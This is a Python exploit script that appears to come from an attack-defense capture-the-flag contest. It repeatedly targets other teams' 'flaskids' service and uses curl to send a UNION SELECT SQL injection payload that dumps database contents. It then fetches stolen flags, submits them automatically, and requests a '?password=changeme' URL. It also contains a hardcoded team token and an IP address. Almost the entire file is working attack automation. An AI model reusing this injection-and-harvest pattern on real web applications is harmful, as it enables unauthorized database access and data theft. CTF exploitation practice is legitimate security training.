#!/usr/bin/env python3

import swpag_client
import os
import time

URL = "52.37.204.0"
TEAM_URL = "http://" + URL + "/"
TEAM_FLAG_TOKEN = "nt4yw7LjoPFc2WE49cLG"
SERVICE_ID = 3 # Update for each exploit to target the correct service
EXCLUDE_TEAM_NAME = "Team 12"


def module_name():
  return "flaskids-exploit"

def module_help():
  return "a flaskids exploit to be thrown by the auto-runner module"

def module_usage():
  return "{0}".format(module_name())

def main():
  tick_id = -1
  start_time = time.time()
  team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
  
  while True:
    try:
      tick_info = team.get_tick_info()
      new_tick_id = tick_info['tick_id']
      seconds_left = tick_info['approximate_seconds_left']

      os.system("sudo rm -rf temp && sudo mkdir temp")

      for target in team.get_targets(SERVICE_ID):
        # Ignore our own team
        if (target["team_name"] == EXCLUDE_TEAM_NAME):
          continue

        flag_id = target["flag_id"]
        hostname = target["hostname"]
        port = target["port"]

        os.system("curl -m 2 --silent \"{0}:10003/kid?first=%25&last=%25'%20UNION%20SELECT%20description%20AS%20data%20from%20parties;--&age=1\" > ./temp/results{1}.txt".format(hostname, hostname))
        x = None
        with open("temp/results{0}.txt".format(hostname), "r+") as f:
          x = f.readline()
          x = x[12:]

        os.system("curl -m 2 --silent \"{0}:10003/find?kid={1}\" > ./temp/results_flags{2}.txt".format(hostname, x.strip("\r\n"), hostname))
        flags = None
        with open("./temp/results_flags{0}.txt".format(hostname), "r+") as f:
            flags = f.readline()
            flags = flags[28:]

        count = 0
        flags = [flag for flag in flags.split(",") if flag[:3] == 'FLG']
        batches = (len(flags) // 100) + 1
        for i in range(batches):
          batch = flags[i*100:(i+1)*100]
          if len(batch) > 0:
            results = team.submit_flag(batch)
            for result in results:
              if result == 'correct':
                count += 1
        if count > 0:
          print("Exploiting {0} -- {1} correct!".format(hostname, count))

        os.system("curl -m 2 --silent {0}:10003?password=changeme".format(hostname))
        
    except Exception as e:
      print(e)

if __name__ == "__main__":

  main()
